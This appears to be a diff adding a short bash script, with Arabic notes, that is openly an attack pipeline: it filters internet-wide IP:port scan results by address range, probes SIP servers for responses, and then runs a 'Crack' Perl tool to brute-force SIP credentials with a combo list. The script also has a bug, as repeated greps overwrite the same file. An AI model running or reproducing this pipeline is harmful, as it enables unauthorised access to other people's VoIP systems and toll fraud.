@@ -1,0 +1,65 @@
+بنظف ملف الايبيهات اى بى : بورت
+بضيف كلمة اول السطر
+ببحث عن رنجات معينة اول السطر
+بنظف تاني 
+بعطينى رسائل الاتصال وبختار نوعين للتخمين
+ببدء تخمين بقائمة ان شاء الله تكون مميزة مع الكومبو
+
+تحياتي
+
+
+#!/bin/bash
+
+# Scan IPv4 range on ports
+echo -e "\nStart scanning ...\n"
+
+grep -Po "(\d+\.){3}\d+:?(\d?){6}" Allworldresult.txt >>Allworldresult2.txt
+
+awk '$0="Mohammad"$0' Allworldresult2.txt >Hosts.txt
+
+grep -R 'Mohammad190' Hosts.txt >newHosts.txt
+grep -R 'Mohammad191' Hosts.txt >newHosts.txt
+grep -R 'Mohammad192' Hosts.txt >newHosts.txt
+grep -R 'Mohammad193' Hosts.txt >newHosts.txt
+grep -R 'Mohammad194' Hosts.txt >newHosts.txt
+grep -R 'Mohammad195' Hosts.txt >newHosts.txt
+grep -R 'Mohammad196' Hosts.txt >newHosts.txt
+grep -R 'Mohammad197' Hosts.txt >newHosts.txt
+grep -R 'Mohammad198' Hosts.txt >newHosts.txt
+grep -R 'Mohammad199' Hosts.txt >newHosts.txt
+grep -R 'Mohammad200' Hosts.txt >newHosts.txt
+
+grep -Po "(\d+\.){3}\d+:?(\d?){6}" newHosts.txt >>newHosts1.txt
+grep -R ':' newHosts1.txt >IPS
+rm newHosts1.txt
+rm newHosts.txt
+rm Hosts.txt
+rm Allworldresult2.txt
+sleep 1
+
+echo -e "\nEnding scanning port !\n"
+echo -e "\nEnding scanning port !\n"
+
+# SIP Responses
+
+echo -e "\nStart SIP Responses ...\n"
+
+perl run IPS
+cat 403.pal 404.pal >> ipSIP
+rm IPS # remove the file IPS
+sleep 2
+
+echo -e "\nEnding Responses !\n"
+
+# SIP Crack
+
+echo -e "\nStart SIP Crack ...\n"
+
+perl Crack 1000 2 ipSIP
+rm ipSIP # remove the file ipSIP
+rm *.pal # remove the file
+
+sleep 2
+
+echo -e "\nEnding crack !\n"
+echo -e "\nby Mohammad Elnwajha\n"
